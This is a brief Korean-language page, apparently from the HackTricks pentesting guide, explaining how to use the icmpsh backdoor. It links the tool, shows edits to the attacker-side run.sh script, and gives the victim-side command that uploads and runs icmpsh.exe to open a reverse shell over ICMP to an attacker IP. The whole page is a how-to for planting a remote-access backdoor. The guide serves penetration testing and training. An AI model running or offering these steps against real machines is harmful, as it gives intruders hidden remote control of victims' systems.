{{#include ../banners/hacktricks-training.md}}

백도어를 다운로드하려면: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# 클라이언트 측

스크립트를 실행하세요: **run.sh**

**오류가 발생하면 다음 줄을 변경해 보세요:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**대상:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **피해자 측**

**icmpsh.exe**를 피해자에게 업로드하고 실행합니다:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
